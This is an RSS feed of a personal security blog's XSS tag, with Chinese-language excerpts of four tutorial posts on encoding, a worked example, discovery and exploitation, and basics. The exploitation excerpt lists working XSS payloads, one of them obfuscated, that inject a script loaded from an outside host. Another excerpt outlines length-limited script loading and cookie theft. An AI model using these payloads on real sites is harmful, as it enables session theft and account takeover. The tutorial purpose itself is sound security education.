<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Xss on </title>
    <link>http://wyb0.com/tags/xss/</link>
    <description>Recent content in Xss on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Thu, 30 Mar 2017 15:25:37 +0800</lastBuildDate>
    
	<atom:link href="http://wyb0.com/tags/xss/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>XSS中的编码</title>
      <link>http://wyb0.com/posts/xss-encode/</link>
      <pubDate>Thu, 30 Mar 2017 15:25:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-encode/</guid>
      <description>0x00 浏览器解析  浏览器收到服务器发来的HTML内容，会从头解析，遇到&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;时， 会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容， 对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本， 在这之前它是HTML的一部分   0x01 一些编码  URL编码
%+字符的ASCII编码对应的两位十六进制，如&amp;quot;/&amp;quot;的url编码为&amp;quot;%2F&amp;quot;  HTML编码
 实体编码
&amp;amp;开头分号结尾，如 &amp;quot;&amp;lt;&amp;quot; 的编码是 &amp;quot;&amp;amp;lt;&amp;quot;  字符编码
样式为&amp;quot;&amp;amp;#数值;&amp;quot;，数值可为10进制、16进制ASCII编码或unicode字符编码 如&amp;quot;&amp;lt;&amp;quot;可编码为&amp;quot;&amp;amp;#060;&amp;quot;和&amp;quot;&amp;amp;#x3c;&amp;quot;，但是必须在属性值里面   JS编码
1、两个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\x3c&amp;quot; 2、三个八进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\074&amp;quot; 3、四个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\u003c&amp;quot; 4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）  CSS编码
反斜线(\)后跟1~6位的16进制数字，如&amp;quot;e&amp;quot;为&amp;quot;\65&amp;quot;或&amp;quot;65&amp;quot;或&amp;quot;00065&amp;quot;   0x02 编码与解码顺序  解码时先解码最外层，编码时先编码最内层
如&amp;lt;td onclick=&amp;quot;openUrl(add.do?userName=&#39;{$value}&#39;);&amp;quot;&amp;gt;11&amp;lt;/td&amp;gt;， 首先value出现在url中，而url在js中，而js又是html一部分，所以 解码顺序为：html解码-&amp;gt;js解码-&amp;gt;url解码 编码顺序为：url编码-&amp;gt;js编码-&amp;gt;html编码   0x03 利用  八进制
&amp;lt;p id=&amp;quot;test&amp;quot;&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; var test = &amp;quot;\74\151\155\147\40\163\162\143\75\170\40\157\156\145\162\162\157\162\75\141\154\145\162\164\50\61\51\76&amp;quot;; var p = document.getElementById(&#39;test&#39;); #这里会进行js解码 p.</description>
    </item>
    
    <item>
      <title>XSS实例</title>
      <link>http://wyb0.com/posts/xss-example/</link>
      <pubDate>Sun, 17 Jul 2016 23:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-example/</guid>
      <description>首先感谢凯神的指导。。。
0x00 注册账号  先得到一个临时邮箱，然后注册账号  0x01 找输入输出点   0x02 尝试构造payload  payload用如下的即可：
&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;a  但是这个要在点击删除时payload才起作用 也可用&amp;lt;img src=1 onerror=alert(1) /&amp;gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js   0x03 加载自己的js  此时的限制条件为：   * 30个字符 * script标签不能自己触发    只能构造类似下面的语句自己加载脚本：   a=document.createElement(&#39;script&#39;); a.src=&amp;quot;www.xxx.com&amp;quot;; document.head.appendChild(a);    可以用如下方法分割，多次添加：   a=document.createE/* */lement(&#39;script&#39;);/* */a.src=&amp;quot;www.xxx.com&amp;quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行    查找  构造payload    使用如下payload： &amp;lt;svg/onload=&amp;quot;b=&#39;http://t.</description>
    </item>
    
    <item>
      <title>XSS漏洞挖掘与利用</title>
      <link>http://wyb0.com/posts/xss-use-and-defense/</link>
      <pubDate>Fri, 15 Jul 2016 16:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-use-and-defense/</guid>
      <description>0x00 XSS的检测  检测XSS一般分两种方法：一种是手工检测、一种是软件自动检测
手工检测：检测结果准确，但对于大型web来说费时费力
软件检测：方便省力，但存在误报，且有些隐蔽的XSS无法检测出
检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出
1. 手工检测 可得知输出位置: • 输入敏感字符，如“&amp;lt;、&amp;gt;、&amp;quot;、&#39;、()”等，然后在提交后查看html源代码，看这些字符是否被转义。 • 在输出这些字符时，程序可能已经进行了过滤，可以输入“AAAAAA&amp;lt;&amp;gt;&amp;quot;&amp;amp;&#39;()”字符串，然后查找AAAAAA或许比较方便。 无法得知输出位置: 很多web应用程序源码不公开，在测试时不能得知输出位置，比如，有些留言版在留言后必须经过管理员审核才能显示，无法得知数据在后台管理页面处于何种状态，如： 在标签中：&amp;lt;div&amp;gt;XSS Test&amp;lt;/div&amp;gt; 在属性内：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;content&amp;quot; value=&amp;quot;XSS Test&amp;quot; /&amp;gt; 这种情况通常采用输入&amp;quot;/&amp;gt;XSS Test来测试。  2. 全自动检测XSS 如APPSCAN、AWVS、Burp Suite等软件都可以有效的检测XSS，他们还会检测其他的漏洞，但是他们的效率不如专业的XSS检测工具高。
专业的XSS扫描工具有知名的XSSER、XSSF等，还有专门扫描DOM类型XSS的web服务(www.domxssscanner.com)。
一般要手工和软件一起使用，因为有些XSS软件不能检测，比如有些留言需要输入验证码等，工具无法做到。
 0x01 XSS的挖掘与利用  XSS漏洞挖掘
反射型XSS： 一般是url参数中的值能够回显到HTML中，且url的参数值没有过滤或过滤不严 存储型XSS： 可以提交内容 提交的内容可被管理员或其他用户看到 提交的内容没有被过滤或过滤不严  XSS漏洞利用 XSS一般就是闭合标签，和SQL注入类似，常见payload如下：
• &amp;lt;script src=&#39;http://b.ioio.pub/xss/probe.js&#39;&amp;gt;&amp;lt;/script&amp;gt; • &amp;lt;img src=x onerror=&amp;quot;s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;http://b.ioio.pub/xss/probe.js&#39;&amp;quot;;&amp;gt; • &amp;lt;svg onload=s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;http://b.ioio.pub/xss/probe.js&amp;gt; • &amp;lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99, 114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59, 115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47, 112,114,111,98,101,46,106,115)) &amp;gt;   0x03 XSS简单示例  反射型xss简单示例: • &amp;lt;?</description>
    </item>
    
    <item>
      <title>XSS初识</title>
      <link>http://wyb0.com/posts/xss-basis/</link>
      <pubDate>Fri, 15 Jul 2016 10:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-basis/</guid>
      <description>0x00 简介  XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&amp;rdquo;脚本&amp;rdquo;这两个字上，脚本主要有两个：JavaScript和ActionScript。
要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。
 0x01 危害  JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。
• 盗取管理员Cookie • XSS Worm • 挂马(水坑攻击) • 键盘记录(有局限性) • 利用网站重定向 • 修改网页内容 • 等等   0x02 攻击场景  在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。
• 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等 • url的参数，回显到网页上 • form表单提交的内容出现在网页上，如：昵称、邮箱、简介、留言 • 等等   0x03 分类  主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。
  反射型XSS
   反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。
简单流程： 1. 用户访问带有XSS代码的URL请求 2. 服务器端接收数据后处理，然后返回带有XSS代码的数据发送给浏览器 3. 浏览器解析带有XSS代码的数据后，最终造成XSS漏洞 可能攻击流程： 1. 用户aaa在网站www.xxx.com浏览网页 2. 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码， 3. 构造的代码的功能为盗取用户Cookie并发送到指定站点www.xxser.com 4. hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击 5.</description>
    </item>
    
  </channel>
</rss>